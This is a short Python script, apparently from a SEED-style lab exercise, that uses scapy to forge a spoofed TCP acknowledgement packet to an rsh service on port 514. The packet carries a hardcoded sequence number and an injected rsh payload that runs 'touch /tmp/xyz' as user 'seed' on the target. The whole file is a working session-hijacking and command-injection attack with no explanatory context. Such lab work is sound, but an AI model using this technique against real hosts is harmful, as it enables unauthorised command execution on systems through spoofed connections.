from scapy.all import *

print("SPOOFING CONTINUED ATTACK PACKET ON TCP CONNECTION........")
src_ip = "10.9.0.6"
dst_ip = "10.9.0.5"

src_port = 1023
dst_port = 514

seq_num = 424717520
ack_num = 4097

ip_layer = IP(src=src_ip, dst=dst_ip)
tcp_layer = TCP(sport=src_port, dport=dst_port, flags="A",
			seq=seq_num,
			ack=ack_num
		)

data = '9090\x00seed\x00seed\x00touch /tmp/xyz\x00'
tcp_pkt = ip_layer / tcp_layer / data
send(tcp_pkt)
